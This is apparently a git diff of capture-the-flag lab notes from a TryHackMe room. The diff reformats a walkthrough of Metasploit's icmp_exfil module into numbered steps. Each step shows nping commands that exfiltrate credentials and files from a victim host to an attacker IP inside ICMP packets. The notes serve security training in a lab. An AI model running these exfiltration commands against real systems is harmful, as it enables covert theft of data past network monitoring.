@@ -361,53 +361,53 @@ Metasploit has a module called `icmp_exfil` which uses the same technique we jus
 
 ![Metasploit icmp_exfil BOF and EOF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b45715c44b5998fa9bf6a989b1e0d8d6.png)
 
-Let's see how to setup Metasploit's `icmp_exfil` module:
+1. Let's see how to setup Metasploit's `icmp_exfil` module:
 
-```shell
-# launch metasploit
-$ sudo msfconsole
+    ```shell
+    # launch metasploit
+    $ sudo msfconsole
 
-# use the icmp_exfil module
-msf6 > use auxiliary/server/icmp_exfil
+    # use the icmp_exfil module
+    msf6 > use auxiliary/server/icmp_exfil
 
-# define the required options
-msf6 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKER_IP
-# BPF_FILTER => icmp and not src ATTACKER_IP
-msf6 auxiliary(server/icmp_exfil) > set INTERFACE tun0
-# INTERFACE => tun0
+    # define the required options
+    msf6 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKER_IP
+    # BPF_FILTER => icmp and not src ATTACKER_IP
+    msf6 auxiliary(server/icmp_exfil) > set INTERFACE tun0
+    # INTERFACE => tun0
 
-# run the module
-msf6 auxiliary(server/icmp_exfil) > run
-```
+    # run the module
+    msf6 auxiliary(server/icmp_exfil) > run
+    ```
 
-The `BPF_FILTER` option is used so it captures only ICMP packets, `set BPF_FILTER icmp`, and ignore any ICMP packets that have the source IP of the attacking machine, `and not src ATTACKER_IP`.
+    The `BPF_FILTER` option is used so it captures only ICMP packets, `set BPF_FILTER icmp`, and ignore any ICMP packets that have the source IP of the attacking machine, `and not src ATTACKER_IP`.
 
-We also need to select which network interface to listen to. We can see our network interfaces via the `ifconfig` command:
+    We also need to select which network interface to listen to. We can see our network interfaces via the `ifconfig` command:
 
-![ifconfig](ifconfig.png)
+    ![ifconfig](ifconfig.png)
 
-This room has prepared the `icmp.thm.com` machine as the victim for this task, so we can log into it via SSH (first connect to Jumpbox, and from Jumpbox connect to `icmp.thm.com`). This machine has the [NPING](https://nmap.org/nping/) tool installed, which is part of the **NMAP** suite.
+2. This room has prepared the `icmp.thm.com` machine as the victim for this task, so we can log into it via SSH (first connect to Jumpbox, and from Jumpbox connect to `icmp.thm.com`). This machine has the [NPING](https://nmap.org/nping/) tool installed, which is part of the **NMAP** suite.
 
-Once logged into the `icmp.thm.com`, we need to send the **BOF trigger** so that Metasploit starts writing to the disk. The **BOF trigger** defaults to "*^BOF*", followed by the filename being sent:
+    Once logged into the `icmp.thm.com`, we need to send the **BOF trigger** so that Metasploit starts writing to the disk. The **BOF trigger** defaults to "*^BOF*", followed by the filename being sent:
 
-```shell
-# send the BOF trigger to the attacking machine
-thm@icmp-host:~$ sudo nping --icmp 10.10.106.32 --data-string "BOFfile.txt" -c 1 
-```
+    ```shell
+    # send the BOF trigger to the attacking machine
+    thm@icmp-host:~$ sudo nping --icmp 10.10.106.32 --data-string "BOFfile.txt" -c 1 
+    ```
 
-Now that we initiated the disk writing process, we can sent the data we want to exfiltrate, for example, the credentials `admin:password`. Note that we sent the data without converting it to hex first, Metasploit did that for us:
+3. Now that we initiated the disk writing process, we can sent the data we want to exfiltrate, for example, the credentials `admin:password`. Note that we sent the data without converting it to hex first, Metasploit did that for us:
 
-```shell
-# send the data we want to exfiltrate to the attacking machine
-thm@icmp-host:~$ sudo nping --icmp 10.10.106.32 --data-string "admin:password" -c 1 
-```
+    ```shell
+    # send the data we want to exfiltrate to the attacking machine
+    thm@icmp-host:~$ sudo nping --icmp 10.10.106.32 --data-string "admin:password" -c 1 
+    ```
 
-Finally, we need to send the **EOF trigger**, which defaults to "*^EOF*", to let Metasploit know that we have sent all the data we needed:
+4. Finally, we need to send the **EOF trigger**, which defaults to "*^EOF*", to let Metasploit know that we have sent all the data we needed:
 
-```shell
-# send the EOF trigger to the attacking machine
-thm@icmp-host:~$ sudo nping --icmp 10.10.106.32 --data-string "EOF" -c 1
-```
+    ```shell
+    # send the EOF trigger to the attacking machine
+    thm@icmp-host:~$ sudo nping --icmp 10.10.106.32 --data-string "EOF" -c 1
+    ```
 
 The whole process can be shown below:
 
